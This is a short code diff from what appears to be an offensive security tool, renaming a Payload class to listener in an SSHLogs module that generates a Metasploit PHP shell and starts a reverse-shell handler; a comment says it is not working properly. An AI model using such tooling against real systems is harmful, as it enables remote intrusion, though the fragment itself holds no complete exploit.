@@ -1,7 +1,7 @@
 from os import system
 from urllib import parse
 
-from .utils import Payload, attack, colors, cook, msf_payload
+from .utils import listener, attack, colors, cook, msf_payload
 
 
 #TODO: Not working properly. Fix this
@@ -17,7 +17,7 @@ class SSHLogs:
 
         lhost, lport, shell = msf_payload()
 
-        handle = Payload(lhost, lport)
+        handle = listener(lhost, lport)
         handle.handler()
 
         with open('/tmp/{0}.php'.format(shell), 'r') as f:
